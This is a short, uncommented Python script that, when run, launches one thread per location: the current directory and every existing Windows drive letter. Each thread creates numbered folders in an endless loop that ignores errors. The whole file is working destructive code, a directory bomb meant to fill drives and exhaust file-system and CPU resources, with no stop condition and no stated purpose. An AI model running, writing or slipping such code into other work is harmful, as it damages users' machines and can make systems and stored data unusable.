import threading
import os

class NewDir(threading.Thread):

    def __init__(self,t_path):
        threading.Thread.__init__(self)
        self.path = t_path

    def run(self):

        a = 1
        while True:
            try:
                os.mkdir(os.path.join(self.path,str(a)))
            except:
                a += 1
                continue
            a += 1

def get_paths():

    the_path = os.path.abspath(".")
    paths = [the_path]
    for i in range(65,91):
        _p = chr(i)+":"
        if os.path.isdir(_p):
            paths.append(_p)
    return paths

def go():
    paths = get_paths()
    ts = []
    for i in paths:
        ts.append(NewDir(i))
    for k in ts:
        k.start()
    for t in ts:
        t.join()

go()

